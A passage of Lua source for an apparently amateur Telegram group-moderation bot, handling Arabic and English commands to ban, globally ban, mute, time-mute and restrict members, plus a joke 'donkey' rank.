end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unban_by_reply)
end
channel_get_kicked(msg.chat_id_,hxouse)
end
---------------------------------HXOUSE TEAM--------------------------------------------------------------
if text:match("^[Uu]nban @(.*)$") then
local ap = {string.match(text, "^([Uu]nban) @(.*)$")}
function unban_by_username(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.id_)
local hxouse_res = user_info_
if user_info_ then
if result.id_ then
if not hxousedx1:sismember(HXOUSE..'bot:banned:'..msg.chat_id_, result.id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..result.id_..' ، ༯\n⌯︙ is not banned ༯ \nֆ                 ֆ*', 1, 'md')
else
text = '⌯︙ العضو ( '..hxouse_res..' )\n⌯︙ ايديه ( '..result.id_..' )\n⌯︙ بواسطه ( '..renk_hxouse(msg)..' )\n⌯︙ لم يتم ( حظره ) سابقا'
end
else
hxousedx1:srem(HXOUSE..'bot:banned:'..msg.chat_id_, result.id_)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '*⌯︙ The User ؛ '..result.id_..' ، 🚷\n⌯︙ has been unbanned ༯ \nֆ                 ֆ*'
else
text = '⌯︙ المحظور ( '..hxouse_res..' )\n⌯︙ ايديه ( '..result.id_..' )\n⌯︙ بواسطه ( '..renk_hxouse(msg)..' )\n⌯︙ تم ( الغاء حظره ) من المجموعه'
end
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '*⌯︙ Username is not correct *'
else
text = '*⌯︙ المعرف غير صحيح *'
end
end
end
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],unban_by_username)
end
--------------------------------HXOUSE TEAM---------------------------------------------------------------
if text:match("^[Uu]nban (%d+)$") then
local ap = {string.match(text, "^([Uu]nban) (%d+)$")}
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. ap[2])
local hxouse_res = user_info_
if user_info_ then
if not hxousedx1:sismember(HXOUSE..'bot:banned:'..msg.chat_id_, ap[2]) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..ap[2]..' ، 🚷\n⌯︙ has been unbanned ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..ap[2]..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *لم يتم ( حظره ) سابقا*', 1, 'md')
end
else
hxousedx1:srem(HXOUSE..'bot:banned:'..msg.chat_id_, ap[2])
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..ap[2]..' ، 🚷\n⌯︙ has been unbanned ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *المحظور* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..ap[2]..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم ( الغاء حظره ) من المجموعه*', 1, 'md')
end
end
end
end
-------------------------------------HXOUSE TEAM--------------------------------------------------------
local text = msg.content_.text_:gsub('حظر عام','Banall')
if text:match("^[Bb]anall$") and is_sudo(msg) and msg.reply_to_message_id_ then
function gban_by_reply(extra, result, success)
local gps = hxousedx1:scard(HXOUSE.."bot:groups")
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
local hash = 'bot:gban:'
hxousedx1:sadd(HXOUSE..hash, result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..result.sender_user_id_..' ، 🚷\n⌯︙ has been globaly banned ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم حظره من ( '..gps..' ) مجموعه*', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
end
----------------------------------------HXOUSE TEAM-------------------------------------------------------
if text:match("^[Bb]anall @(.*)$") and is_sudo(msg) then
local aps = {string.match(text, "^([Bb]anall) @(.*)$")}
function gban_by_username(extra, result, success)
local gps = hxousedx1:scard(HXOUSE.."bot:groups")
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.id_)
local hxouse_res = user_info_
if user_info_ then
local hash = 'bot:gban:'
if result.id_ then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '*⌯︙ The User ؛ '..result.id_..' ، 🚷\n⌯︙ has been globaly banned ༯ \nֆ                 ֆ*'
else
text = '⌯︙ العضو ( '..hxouse_res..' )\n⌯︙ ايديه ( '..result.id_..' )\n⌯︙ بواسطه ( '..renk_hxouse(msg)..' )\n⌯︙ تم حظره من ( '..gps..' ) مجموعه'
end
hxousedx1:sadd(HXOUSE..hash, result.id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '*⌯︙ Username is not correct *'
else
text = '*⌯︙ المعرف غير صحيح *'
end
end
end
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(aps[2],gban_by_username)
end
----------------------------------HXOUSE TEAM-------------------------------------------------------------
if text:match("^[Bb]anall (%d+)$") and is_sudo(msg) then
local ap = {string.match(text, "^([Bb]anall) (%d+)$")}
local gps = hxousedx1:scard(HXOUSE.."bot:groups")
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. ap[2])
local hxouse_res = user_info_
if user_info_ then
local hash = 'bot:gban:'
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..ap[2]..' ، 🚷\n⌯︙ has been globaly banned ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..ap[2]..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم حظره من ( '..gps..' ) مجموعه*', 1, 'md')
end
end
hxousedx1:set(HXOUSE..'bot:gban:'..ap[2],true)
hxousedx1:sadd(HXOUSE..hash, ap[2])
end
---------------------------------------HXOUSE TEAM--------------------------------------------------------
local text = msg.content_.text_:gsub('الغاء العام','unbanall')
if text:match("^[Uu]nbanall$") and is_sudo(msg) and msg.reply_to_message_id_ then
function ungban_by_reply(extra, result, success)
local gps = hxousedx1:scard(HXOUSE.."bot:groups")
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
local hash = 'bot:gban:'
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..result.sender_user_id_..' ، 🚷\n⌯︙ has been unbanned (Gban) ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم الغاء حظره من ( '..gps..' ) مجموعه*', 1, 'md')
end
end
hxousedx1:srem(HXOUSE..hash, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
end
------------------------------------------HXOUSE TEAM-----------------------------------------------------
if text:match("^[Uu]nbanall @(.*)$") and is_sudo(msg) then
local apid = {string.match(text, "^([Uu]nbanall) @(.*)$")}
function ungban_by_username(extra, result, success)
local gps = hxousedx1:scard(HXOUSE.."bot:groups")
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.id_)
local hxouse_res = user_info_
if user_info_ then
local hash = 'bot:gban:'
if result.id_ then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '*⌯︙ The User ؛ '..result.id_..' ، 🚷\n⌯︙ has been unbanned (Gban) ༯ \nֆ                 ֆ*'
else
text = '⌯︙ العضو ( '..hxouse_res..' )\n⌯︙ ايديه ( '..result.id_..' )\n⌯︙ بواسطه ( '..renk_hxouse(msg)..' )\n⌯︙ تم الغاء حظره من ( '..gps..' ) مجموعه'
end
end
hxousedx1:srem(HXOUSE..hash, result.id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '*⌯︙ Username is not correct *'
else
text = '*⌯︙ المعرف غير صحيح *'
end
end
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(apid[2],ungban_by_username)
end
---------------------------------HXOUSE TEAM--------------------------------------------------------------
if text:match("^[Uu]nbanall (%d+)$") and is_sudo(msg) then
local ap = {string.match(text, "^([Uu]nbanall) (%d+)$")}
local gps = hxousedx1:scard(HXOUSE.."bot:groups")
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. ap[2])
local hxouse_res = user_info_
if user_info_ then
local hash = 'bot:gban:'
hxousedx1:srem(HXOUSE..hash, ap[2])
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..ap[2]..' ، 🚸\n⌯︙ has been unbanned (Gban) ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..ap[2]..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم الغاء حظره من ( '..gps..' ) مجموعه*', 1, 'md')
end
end
end
-----------------------------------------HXOUSE TEAM------------------------------------------------------
if text:match("^كتم$") and msg.reply_to_message_id_ ~= 0 and hxouse11(msg) then
function mute_by_reply(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لا تستطيع كتمي ', 1, 'md')
return false 
end 
if is_momod(result.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *لا تستطيع كتم* ( ['..hxouse_res..'] )\n⌯︙ *لانه يمتلك احدى الرتب ↓↓*\n*⌯︙ ( مميز - ادمن - مدير - منشئ - مطور )*', 1, 'md')
else 
hxousedx1:sadd(HXOUSE..'bot:muted:'..msg.chat_id_, result.sender_user_id_)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم  (كتمه ) بنجاح*', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
----------------------------------------faedrr-------------------------------------------------------
if text:match('^كتم @(.*)$') and is_momod(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
local ap = {string.match(text, '^(كتم) @(.*)$')}
function mute_by_username(extra, result, success)
local hash = 'bot:muted:'..msg.chat_id_
if result.id_ then 
if is_momod(result.id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لا تستطيع كتم الرتب ', 1, 'md')
else
if hxousedx1:sismember(HXOUSE..hash, result.id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( [@'..ap[2]..'] )\n⌯︙ *ايديه* ( *'..result.id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم ( كتمه ) سابقا*', 1, 'md')
else
hxousedx1:sadd(HXOUSE..hash, result.id_)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( [@'..ap[2]..'] )\n⌯︙ *ايديه* ( *'..result.id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم ( كتمه ) بنجاح*', 1, 'md')
end
end
end
end
resolve_username(ap[2],mute_by_username)
end
---------------------------------HXOUSE TEAM--------------------------------------------------------------
if text:match("^[Mm]uteuser (%d+)$") and hxouse11(msg) then
local ap = {string.match(text, "^([Mm]uteuser) (%d+)$")}
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. ap[2])
local hxouse_res = user_info_
if user_info_ then
if hxousedx1:sismember(HXOUSE..'bot:muted:'..msg.chat_id_, ap[2]) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..ap[2]..' ، 🚷\n⌯︙ is already muted ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..ap[2]..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم  (كتمه ) سابقا*', 1, 'md')
end
end
hxousedx1:sadd(HXOUSE..'bot:muted:'..msg.chat_id_, ap[2])
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..ap[2]..' ، ??\n⌯︙ has been muted ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..ap[2]..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم  (كتمه ) بنجاح*', 1, 'md')
end
end
end
end
------------------------------------HXOUSE TEAM-----------------------------------------------------------
local text = msg.content_.text_:gsub('الغاء كتم','Unmuteuser')
if text:match("^[Uu]nmuteuser$") and msg.reply_to_message_id_ ~= 0 and hxouse11(msg) then
function unmute_by_reply(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
local hash = 'bot:muted:'..msg.chat_id_
if not hxousedx1:sismember(HXOUSE..hash, result.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..result.sender_user_id_..' ، 🚷\n⌯︙ not muted ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *لم يتم ( كتمه ) سابقا*', 1, 'md')
end
else
hxousedx1:srem(HXOUSE..hash, result.sender_user_id_)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..result.sender_user_id_..' ، 🚷\n⌯︙ has been unmuted ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *المكتوم* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم  ( الغاء كتمه ) بنجاح*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unmute_by_reply)
end
------------------------------------HXOUSE TEAM-----------------------------------------------------------
if text:match("^[Uu]nmuteuser @(.*)$") then
local ap = {string.match(text, "^([Uu]nmuteuser) @(.*)$")}
function unmute_by_username(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.id_)
local hxouse_res = user_info_
if user_info_ then
if result.id_ then
if not hxousedx1:sismember(HXOUSE..'bot:muted:'..msg.chat_id_, result.id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..result.id_..' ، 🚷\n⌯︙ not muted ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *لم يتم ( كتمه ) سابقا*', 1, 'md')
end
else
hxousedx1:srem(HXOUSE..'bot:muted:'..msg.chat_id_, result.id_)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '*⌯︙ The User ؛ '..result.id_..' ، 🚷\n⌯︙ has been unmuted ༯ \nֆ                 ֆ*'
else
text = '⌯︙ المكتوم ( '..hxouse_res..' )\n⌯︙ ايديه ( '..result.id_..' )\n⌯︙ بواسطه ( '..renk_hxouse(msg)..' )\n⌯︙ تم ( الغاء كتمه ) بنجاح'
end
end
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '*⌯︙ Username is not correct *'
else
text = '*⌯︙ المعرف غير صحيح *'
end
end
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],unmute_by_username)
end
---------------------------------HXOUSE TEAM--------------------------------------------------------------
if text:match("^[Uu]nmuteuser (%d+)$") then
local ap = {string.match(text, "^([Uu]nmuteuser) (%d+)$")}
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. ap[2])
local hxouse_res = user_info_
if user_info_ then
if not hxousedx1:sismember(HXOUSE..'bot:muted:'..msg.chat_id_, ap[2]) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..ap[2]..' ، 🚷\n⌯︙ not muted ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..ap[2]..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *لم يتم ( كتمه ) سابقا*', 1, 'md')
end
else
hxousedx1:srem(HXOUSE..'bot:muted:'..msg.chat_id_, ap[2])
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..ap[2]..' ، 🚷\n⌯︙ has been unmuted ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *المكتوم* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..ap[2]..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم  ( الغاء كتمه ) بنجاح*', 1, 'md')
end
end
end
end
end 
------------------------------------------HXOUSE TEAM-----------------------------------------------------
if msg.reply_to_message_id_ ~= 0  then
if text:match("^رفع مطي$") then
function donky_by_reply(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
local hash = 'bot:donky:'..msg.chat_id_
if hxousedx1:sismember(HXOUSE..hash, result.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ User ؛ '..result.sender_user_id_..' ، 🚷\n⌯︙ is now a donky ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * ( هو مطي شرفع منه بعد 😔😹 ) *', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ User ؛ '..result.sender_user_id_..' ، ⏱\n⌯︙ has been a Full donky  😂💔\nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم رفعه ( مطي  🐴 ) *', 1, 'md')
end
hxousedx1:sadd(HXOUSE..hash, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end
end
----------------------------------------HXOUSE TEAM-------------------------------------------------------
if msg.reply_to_message_id_ ~= 0  then
if text:match("^تنزيل مطي$") then
function donky_by_reply(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
local hash = 'bot:donky:'..msg.chat_id_
if not hxousedx1:sismember(HXOUSE..hash, result.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..result.sender_user_id_..' ، 🚷\n⌯︙ is not a donky ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * ( لم يتم رفعه مطي ) *', 1, 'md')
end
else
hxousedx1:srem(HXOUSE..hash, result.sender_user_id_)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The vip ؛ '..result.sender_user_id_..' ، 🚷\n⌯︙ was removed from donky list \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *المطي* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * ( يبقه مطي بس حنزله لخاطرك 😔😹 ) *', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end
end
----------------------------------------------HXOUSE TEAM-------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then  
if text:match("^تقييد$") and hxouse11(msg) then  
function mute_by_reply(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لا تستطيع تقييدي ', 1, 'md')
return false 
end 
if is_momod(result.sender_user_id_, msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *لا تستطيع تقييد* ( ['..hxouse_res..'] )\n⌯︙ *لانه يمتلك احدى الرتب ↓↓*\n*⌯︙ ( مميز - ادمن - مدير - منشئ - مطور )*', 1, 'md')
else 
HTTPS.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.."")
hxousedx1:sadd(HXOUSE..'tkeed:'..msg.chat_id_, result.sender_user_id_)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم  ( تقييده ) بنجاح*', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
----------hxouse 
if msg.reply_to_message_id_ ~= 0 then  
if text:match("^الغاء تقييد$") and hxouse11(msg) then
function mute_by_reply(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
hxousedx(msg.chat_id_, msg.id_, 1, 'هاذا البوت', 1, 'md')  
return false 
end 
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
hxousedx1:srem(HXOUSE..'tkeed:'..msg.chat_id_, result.sender_user_id_)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم  ( الغاء تقييده ) بنجاح*', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
end
end
if text and text:match('^كتم د (%d+)$') and hxouse11(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^كتم د (%d+)$")}
local Minutes = string.gsub(mutept[1], 'm', '')
local num1 = tonumber(Minutes) * 60 
local num = tonumber(num1)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لا تستطيع كتمي ', 1, 'md')
return false end 
if is_momod(result.sender_user_id_, msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *لا تستطيع كتم* ( ['..hxouse_res..'] )\n⌯︙ *لانه يمتلك احدى الرتب ↓↓*\n*⌯︙ ( مميز - ادمن - مدير - منشئ - مطور )*', 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم كتمه لمده ( '..mutept[1]..' ) دقيقه*', 1, 'md')
hxousedx1:sadd(HXOUSE..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end
if text and text:match('^كتم س (%d+)$') and hxouse11(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^كتم س (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600 
local num = tonumber(num1)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لا تستطيع كتمي ', 1, 'md')
return false end 
if is_momod(result.sender_user_id_, msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *لا تستطيع كتم* ( ['..hxouse_res..'] )\n⌯︙ *لانه يمتلك احدى الرتب ↓↓*\n*⌯︙ ( مميز - ادمن - مدير - منشئ - مطور )*', 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم كتمه لمده ( '..mutept[1]..' ) ساعه*', 1, 'md')
hxousedx1:sadd(HXOUSE..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
if text and text:match('^كتم ي (%d+)$') and hxouse11(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^كتم ي (%d+)$")}
local day = string.gsub(mutept[1], 'd', '')
local num1 = tonumber(day) * 86400 
local num = tonumber(num1)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لا تستطيع كتمي ', 1, 'md')
return false end 
if is_momod(result.sender_user_id_, msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *لا تستطيع كتم* ( ['..hxouse_res..'] )\n⌯︙ *لانه يمتلك احدى الرتب ↓↓*\n*⌯︙ ( مميز - ادمن - مدير - منشئ - مطور )*', 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
